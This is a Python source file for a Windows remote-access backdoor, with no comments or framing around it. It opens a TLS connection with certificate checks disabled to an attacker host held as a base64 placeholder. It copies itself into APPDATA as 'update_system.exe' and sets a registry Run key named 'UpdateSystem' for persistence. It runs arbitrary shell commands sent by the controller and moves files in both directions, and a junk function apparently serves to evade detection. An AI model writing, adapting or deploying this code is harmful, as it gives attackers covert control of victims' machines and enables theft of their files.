import socket, subprocess, time, os, sys, base64, shutil, ssl, hashlib

v_h = base64.b64decode("YOUR_IP_BASE64_HERE").decode()
v_p = 443
v_pass = base64.b64decode("YOUR_PASSPHRASE_BASE64_HERE").decode()
END_MARKER = b"__END__"
PERSIST_NAME = "UpdateSystem"

def junk_func_99():
    x = 10 * 5
    if x < 1: return None
    return "clear"

def install_persistence():
    try:
        import winreg
        
        dest_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "SystemUpdate")
        dest_path = os.path.join(dest_dir, "update_system.exe")
        current_path = os.path.abspath(sys.argv[0])

        
        if os.path.normpath(current_path) != os.path.normpath(dest_path):
            os.makedirs(dest_dir, exist_ok=True)
            shutil.copy2(current_path, dest_path)

        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ, dest_path)
        winreg.CloseKey(key)
    except Exception:
        pass

def start_session():
    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            c = context.wrap_socket(raw, server_hostname=v_h)
            c.connect((v_h, v_p))
            c.send(v_pass.encode())
            cwd = os.getcwd()

            while True:
                d = c.recv(4096).decode("utf-8")
                if not d: break

                if d.startswith("__UPLOAD__:"):
                    f_path = d.split(":", 1)[1]
                    c.send(b"READY")
                    size_data = c.recv(1024).decode()
                    if size_data.startswith("SIZE:"):
                        size = int(size_data.split(":")[1])
                        c.send(b"OK")
                        f_data = b""
                        while len(f_data) < size:
                            chunk = c.recv(min(4096, size - len(f_data)))
                            if not chunk: break
                            f_data += chunk
                        with open(f_path, "wb") as f: f.write(f_data)
                        local_hash = hashlib.sha256(f_data).hexdigest()
                        c.send(local_hash.encode())

                elif d.startswith("__DOWNLOAD__:"):
                    f_path = d.split(":", 1)[1]
                    if os.path.exists(f_path):
                        with open(f_path, "rb") as f: file_data = f.read()
                        file_hash = hashlib.sha256(file_data).hexdigest()
                        c.send(f"SIZE:{len(file_data)}".encode())
                        if c.recv(1024).decode() == "OK":
                            c.send(file_data)
                            c.recv(1024)
                            c.send(file_hash.encode())
                    else:
                        c.send(b"ERROR")

                else:
                    cmd = d.strip()
                    
                    if cmd.lower() == "cd":
                        c.send(cwd.encode() + END_MARKER)
                    
                    elif cmd.lower().startswith("cd "):
                        target = cmd[3:].strip()
                        new_path = os.path.join(cwd, target) if not os.path.isabs(target) else target
                        new_path = os.path.normpath(new_path)
                        if os.path.isdir(new_path):
                            cwd = new_path
                            c.send(cwd.encode() + END_MARKER)
                        else:
                            c.send(f"Directory not found: {target}".encode() + END_MARKER)
                    
                    else:
                        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=cwd)
                        out, err = p.communicate()
                        result = out + err if (out + err) else b"DONE"
                        c.send(result + END_MARKER)

        except:
            time.sleep(10)

if __name__ == "__main__":
    junk_func_99()
    install_persistence()
    start_session()